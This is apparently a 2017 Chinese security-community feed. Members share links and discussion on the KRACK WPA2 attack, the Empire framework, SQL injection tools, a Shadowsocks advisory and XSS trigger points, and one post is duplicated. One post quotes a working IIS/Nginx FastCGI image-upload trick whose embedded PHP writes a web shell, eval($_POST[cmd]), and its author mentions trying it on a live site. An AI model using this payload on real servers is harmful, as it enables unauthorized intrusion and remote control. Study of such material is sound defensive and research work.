<img src="https://file.xiaomiquan.com/44/3b/443b7f67fe65375a441d097c8af38fc34f4c994a9b0ef7453481d8c6b6af536a_big.jpg" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ on 2017-10-18:

WPA2密码重装攻击的POC，python脚本写的附带原理论文PDF，www.github.com/jiansiting/wpa2-krack

<img src="https://file.xiaomiquan.com/ee/87/ee87523c7470f1d20a91683c1f6b842296024c2335095132e43a6b01a64bf3b8.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 效果如何

<img src="https://file.xiaomiquan.com/c3/ff/c3ff7b7a3452ad4f7a0a6d1eb752f9b3a7e5bceeafff53d1372943527450dde0.jpg" width="25px"/> __唐古拉老山羊__: 像我这样英文渣，文献根本看不懂啊

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 源头在这:
[krack - Pastebin.com](https://pastebin.com/aZyyS16w)



<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 效果可以，就是严格按照pdf可以走下来，创建了一个同名AP获取数据包。

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ replies to <img src="https://file.xiaomiquan.com/c3/ff/c3ff7b7a3452ad4f7a0a6d1eb752f9b3a7e5bceeafff53d1372943527450dde0.jpg" width="25px"/> __唐古拉老山羊__: 可以参考部分中文

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 我这个是一个github上的朋友发给我的研究和测试的，看开来你提供这个连接应该是最早的poc代码了

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 只是FT，貌似的支持802.11r 才可以

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没错，你看得很仔细，程序的一开始就用文本说明了这个地方

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 
[GitHub - vanhoefm/krackattacks-test-ap-ft](https://github.com/vanhoefm/krackattacks-test-ap-ft)



<img src="https://file.xiaomiquan.com/7e/6e/7e6e47b51f5a9733c99849a1458f703fdb6abecf319d98a1500d009c1f02b46a.jpg" width="25px"/> __Sunset__: 所以，只能针对FT协议的WiFi？并不能wpa2吗？


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-10-18:

关于dark Web(不限于Tor)，关于Anonymous network，darknet，这个博客科普、辟谣、指路了非常多信息，推荐好好阅读每篇文章！

[Secrets of the Dark | Lighting a match in the dark...](https://direclown.wordpress.com)



<img src="https://file.xiaomiquan.com/51/c6/51c6eee1c7adb3e5d91c5c6b80466f3043b7236c27a734fc97ff7e5a73852821.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/b1/56/b156dd5922a0993bd78f5d2404738b9944e81129e5276fcd59a045192247509c.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/c5/cf/c5cf53d012e4270479ea8b3c10283f33d2fd27f0567f860006f1c622f806e15a.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/74/3f/743f78265bfd6981b27d8fc6ee4a7fced0cf6478fcaa48667f1ab24f8a60d7f1.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 不错，很详细


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-18:


__#姿势#__

  WPA2 这个 KRACK 攻击，推荐看 Longas杨叔 这篇文章，清晰明了：


[WPA2被攻破？全球WiFi瘫痪？WiFi末日到来？能再夸张点不](http://mp.weixin.qq.com/s/nEfwjrE3AOORVC89TJHBtg)





...

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 刚看完，杨叔的公众号也是你之前推的😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 嗯

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 用python脚本poc复现了，代码上传到github了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-16:


__#漏洞#__

   关于 WPA2 这个 KRACK 攻击


[https://www.krackattacks.com/](https://www.krackattacks.com/)



今天炒的火热，很多文章标题党也是正常现象，毕竟这是个专业话题...

由于白天都很忙，这里简单转几句我们后来的交流，供大家理解。

Longas杨叔：“花时间仔细看了视频和说明文档，这个 KRACK ATTACK 攻击应该是目前最取巧的针对 WPA/WPA2 的中间人攻击方法。并不针对 WPA 加密本身，而是通过多次重播四次握手的消息3来强制复位本地保存的 WPA 密钥，即把原来正确真实的 WPA 密码替换掉，不破解直接替换，这样就可以将受害者连到伪造的 AP 上，无需任何提示，再配合 SSLStrip 之类的工具做中间人就圆满地实现了基于 Wi-Fi 的无缝中间人攻击。”

余弦：“这个戏法最终是对 Client，视频演示很明显。这种攻击作者也偷懒了，没提这个 MITM（SSLStrip）没法对 Google 进行，大家知道为什么吗？原因是：HSTS。”

目前来看，这个漏洞实战意义还是不错的，要修复应该也不是什么难事。那些乱喊 WPA2 要死的文章，笑笑就罢了。

更多细节等后续再看值得补充就再补充吧。

<img src="https://file.xiaomiquan.com/05/07/05079510f9e4c0efbf78f55d9373d5d790d0be05d794132df47b309ba3476eb1.png" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/c4/d9/c4d9438fb65e0c25a109b77130c9021a79472a8bb4d494b375f37b612ef88465.png" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-10-16:

拭目以待

[KRACK Attacks: Breaking WPA2](https://www.krackattacks.com/)





...

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 细节已放出

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 还有演示视频
[https://www.youtube.com/watch?v=Oh4WURZoR98](https://www.youtube.com/watch?v=Oh4WURZoR98)



<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 要是真裸奔了。。。每天就拿着pc去妹子楼下等她回家。


...

---

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-15:

看到一篇关于端口渗透的总结，认真读完发现自己还有一些是自己没见过的，不知道算不算全面，有好的希望大牛们能分享一下。QAQ
有个师傅给我的建议是找相应的版本，docker部署测试。

[端口渗透总结_91Ri.org](http://www.91ri.org/15441.html)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 肯定不全面呀，看看ZoomEye/Shodan都采集那些端口就知道渗透会关注哪些端口

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 很多链接点进去都是升级中。。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 你不知道wooyun?

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 知道啊，而且有的百度网盘地址也没了[捂脸]

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 😂😂😂,但是里面的案例挺多的，都可以找的到。
刚知道wooyun的时候已经升级四五个月了。🌝，原来他们厂商的妹子这么可爱。😊😊

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 有个玩意叫做镜像QAQ，静香静香，我是胖虎

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 
[端口渗透总结](http://docs.ioin.in/writeup/blog.heysec.org/_archives_577/index.html)




你们之前发的

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: ?
怎么啦。[囧]

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 没事，就是和这个文章一样

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 文章里面的附件都失效了

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 附件是一个各种端口的总结嘛，百度有很多啊

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 然后实际乌云漏洞库一搜就有。


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-10-14:

ss的C语言版server端本地命令执行漏洞
问题出在method参数


[Advisory X41-2017-010: Command Execution in shadow...](https://x41-dsec.de/lab/advisories/x41-2017-010-shadowsocks-libev/)





...

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 另外Python版的ss有个autoban.py，本意是防爆破的，结果存在远程命令执行

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 没见到有autoban.py这个文件啊

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 版本不一样吧

<img src="https://file.xiaomiquan.com/88/74/8874c2e75dca87eba12d12a4c6f9a0b794ad3acffe3e26e4bb4bf3443a32db2e.jpg" width="25px"/> __GUO__: 我问问现在怎么合法fq

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/88/74/8874c2e75dca87eba12d12a4c6f9a0b794ad3acffe3e26e4bb4bf3443a32db2e.jpg" width="25px"/> __GUO__: 貌似企业用户可以去工信部申请


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-13:


__#工具#__

  渗透利用神器 Empire 2.2 发布及一点看法


[Empire 2.2 – Maintaining an Empire – rvrsh3ll’s Bl...](http://www.rvrsh3ll.net/blog/empire/empire-2-2-maintaining-an-empire/)

 

优化了一些问题及增加了一些特性，英文很简单自己看吧。还可以搜搜本圈，之前也发过历史相关。这些 Red Team 牛人在加速 Empire 发展，下一版本说是直接跳到 3.0。

特别说下，Empire 估计不会特别去发展混淆 Empire 技术，他们觉得和杀软们玩打地鼠游戏没意思。其实这个我赞同，文件静态免杀应该自己来，脚本混淆多简单的事。Empire 在渗透其他方面如绕过、伪装、隐藏一直在提升，不过对抗是动态的，不断进化是必然的。

Empire 确实是很优秀的渗透利用框架（其实就是个远控）。Empire 生态能发展还有个重要特性：

REST API。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-13:


__#工具#__

  渗透利用神器 Empire 2.2 发布及一点看法


[Empire 2.2 – Maintaining an Empire – rvrsh3ll’s Bl...](http://www.rvrsh3ll.net/blog/empire/empire-2-2-maintaining-an-empire/)

 

优化了一些问题及增加了一些特性，英文很简单自己看吧。还可以搜搜本圈，之前也发过历史相关。这些 Red Team 牛人在加速 Empire 发展，下一版本说是直接跳到 3.0。

特别说下，Empire 估计不会特别去发展混淆 Empire 技术，他们觉得和杀软们玩打地鼠游戏没意思。其实这个我赞同，文件静态免杀应该自己来，脚本混淆多简单的事。Empire 在渗透其他方面如绕过、伪装、隐藏一直在提升，不过对抗是动态的，不断进化是必然的。

Empire 确实是很优秀的渗透利用框架（其实就是个远控）。Empire 生态能发展还有个重要特性：

REST API。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-13:

推荐看看 GitHub 2017 的这份统计，了解下趋势。


[Python 崛起、JavaScript 制霸 —— GitHub 2017 年度开源报告里的语言之...](http://mp.weixin.qq.com/s/2cWc6O3_38u0eaPmXt-auQ)

 

正好对于我来说，Python 和 JavaScript 是我最熟悉的两门语言。



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 然并卵呀呀

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 为啥

<img src="https://file.xiaomiquan.com/82/82/82825b7290b34936832ec9ff5972ecb1fc30b8ee53d26751f4601f50470e4117.jpg" width="25px"/> __星辰大海__: 人生苦短，我用Py。


...

---

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-13:

几个基友的总结，上传攻击可以说总结的很详细了。

[Upload-Attack](https://04z.net/2017/07/31/Upload-Attack/)

 
-----------------QAQ------------------
顺便提出一个问题，seay博客有一段话，关于iis7.5的解析漏洞的利用:
[+]IIS 7.0/IIS 7.5/Nginx <=0.8.37

IIS 7.0/IIS 7.5/Nginx <=0.8.37

在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。

常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾

e.g.  copy xx.jpg/b + yy.txt/a xy.jpg

######################################

/b 即二进制[binary]模式

/a 即ascii模式 xx.jpg正常图片文件

yy.txt 内容 <?PHP fputs(fopen(‘shell.php’,’w’),'<?php eval($_POST[cmd])?>’);?>

意思为写入一个内容为 <?php eval($_POST[cmd])?> 名称为shell.php的文件

######################################

找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。

然后就在图片目录下生成一句话木马 shell.php 密码 cmd。
我在其他地方看到的是上传jpg后再加上/.php，但是昨天我遇到的那个站点，上传后行不通，404状态，用seay的这个方法也不行，而且也不太明白他这个方法的原理。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这些细节还是得刨根问底

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__: 你的站具体环境是否知道？

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__: iis 7.5+php 5.3,看页面像用的模板，像是定制的。感觉唯一能在后台往服务器加东西的地方只有上传图片那里。

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 怎么确认是否开启的是fastcgi模式

<img src="https://file.xiaomiquan.com/70/06/7006f382b2abf63b4f3ea8ad49decda9a4e5e30ffc4b9b0a6844ed3d38ca6603.jpg" width="25px"/> __super__: 文章总结的很强

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__: 不知道。cgi还没扫描。

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 还有，cgi跟fastcgi不是一个东西。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 知道，这两个理解的不是很清楚。

<img src="https://file.xiaomiquan.com/85/7e/857e7074cd57069c52c64361162a16153347497cda25cad85d234445a06ef8b2.jpg" width="25px"/> __愤怒CPU__: 以前自己搭建试过，大部分web集成包，如wdcp，phpstudy 默认都不会开启这个参数。

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 这是fastcgi的漏洞，php解析有多种方法，并不是说所有的iis 7.5都有这个问题

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 原来如此，很多原理还不明白，谢谢指点。


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-10-12:

一加氧OS窃密事件，没事给自己的设备做做流量分析，也许就发现。。。
[OnePlus OxygenOS built-in analytics](https://www.chrisdcmoore.co.uk/post/oneplus-analytics/)



<img src="https://file.xiaomiquan.com/cb/2c/cb2c84dd33d174bb8d52e92a3356f6a6a8c27645825f4f79341eb1581184c767.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/3e/bc/3ebce5c2bb67c5ad0ea4e2d0dd0d9b2c60e444bc18d1021d44aea7b315216686.jpg" width="25px"/> __heather__: 无语

<img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 手持一加手机一脸茫然


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-10:


__#工具#__

  jSQL Injection 注入神器

在 Kali Linux、Pentest Box,、Parrot Security OS、ArchStrike/BlackArch Linux 等都有集成。

支持注入的数据库如下：

Access, CockroachDB, CUBRID, DB2, Derby, Firebird, H2, Hana, HSQLDB, Informix, Ingres, MaxDB, Mckoi, MySQL, Neo4j, NuoDB, Oracle, PostgreSQL, SQLite, SQL Server, Sybase, Teradata and Vertica，居然有 Neo4j。

还可以轻松对 SOAP、JSON 等数据格式进行注入。

这个神器是免费开源且跨平台的，还自带中文显示！具体见：


[GitHub - ron190/jsql-injection: jSQL Injection is ...](https://github.com/ron190/jsql-injection)



<img src="https://file.xiaomiquan.com/c4/12/c412f4725816d6a7f88bea75a4e946897303438e2584c02bc32a17e9bd82831c.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/8a/64/8a640b64dbb5fabff12fa87efea2176a6fffe6c4269d0c2a512177d7bda7c906.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/d0/bb/d0bbf55c97e0bf153b9ea159257e58aef9bf8193f44e2576fa3cc5ee99d7197a.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/28/eb/28ebb8e2c1481c6199cf698740f0196450e63d690b1e95e2fbbec92cc773da98.jpg" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-09:


__#资源#__

 渗透师必备命令之 awk 与 sed 高级操作

以前刚入门 Linux 渗透时，一位前辈黑客就教会了我们这些命令，学习下来后，在无数的场合下确实大大提升了操作与分析速度。尤其像 awk 这样的命令，本身还可以当成脚本语言，非常强大。

这篇文章来自知名 Red Team，推荐新人们好好过一遍，不仅可以学会这两个命令的高级技巧，还可以学会大量其实很简单的英文。


[https://bluescreenofjeff.com/2017-10-03-f-awk-yeah-advanced-sed-and-awk-usage-parsing-for-pentesters-3/](https://bluescreenofjeff.com/2017-10-03-f-awk-yeah-advanced-sed-and-awk-usage-parsing-for-pentesters-3/)



注意了：任何技巧，不实战，不常用，都会废掉。[微笑]



---

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-10-09:


__#Python安全开发打怪升级之路#__

接下来的话主要分享一些有用标准库和安全开发过程中使用的比较多的模块。


__分享文件:__
[Python基础(二).pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 赞一个


...

---

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-10-09:

#### 0x01 简介
主要根据乌云大约6000条xss中常见的xss触发点和平时测试存在xss可能性比较大的业务位置进行的一份小记，方便快速寻找xss，以及打开个思路。
___
#### 0x02 触发点
- GET/POST以及header中可控参数
- Wifi热点/设备编号构造payload(有些站点会记录历史登录的设备等你这方面信息传到服务器)
- 电话本、短信(有的app会获取你电话本，通话记录等信息，反日)
- 多平台验证构造的payload(一般开发进度不一致，导致可能苹果端的修复了，安卓的还没有)
- 用户注册信息、用户名处
- 构造好的payload存放在二维码、或者隐性的让用户触发(比如写一个类似antigravity模块)
- 直播评论位置
- 在线客服交流
- 分享到第三方平台
- 富文本相关的编辑器
- 企业自己搭建的邮箱
- 站内消息/私信
- 各类搜索
- 浏览器插件
- 发红包xss
- 记事本、Word、PDF等一些在线预览功能
- Flash
- 搜索框
- 搜索过后的历史记录
- API接口
- 上传功能点相关位置
- 报销发票处
- 移动app用户反馈
- MHTML协议
- 站点的手机web端(一般waf薄弱)
- ATM机
- 论坛等伪协议
- 回复短信触发接受平台
- 在线音乐添加歌词、修改上传本地音乐等属性
- 图片上传、属性等可控参数
- 截图上传
- 页面读取系统时间
- OCR识别后触发xss
- 微信公共号
- 购物下单
- 百度快照
- 举报页面
- 自动应答机器人、与智能设备对话输出
- 收藏夹
- Whois信息xss
- 语音翻译
- KTV点歌
- 一句话一切可控输入、输出



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 总结太好啦！

<img src="https://file.xiaomiquan.com/2e/d6/2ed601f524a093a2ef25692413f618bd2d947cde8075dc813b98205b2daef33d.jpg" width="25px"/> __据说好的名字很容易被别人记住__: 我现在还看不懂😂

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 还一些地理位置坐标等位置，想起来再加了233

<img src="https://file.xiaomiquan.com/23/cb/23cbc502bad8ece30efc8aeb0f0d125d08a34c5845eff16d768e543a45acb9a7.jpg" width="25px"/> __liuz__: 如果能列出案例就更好了

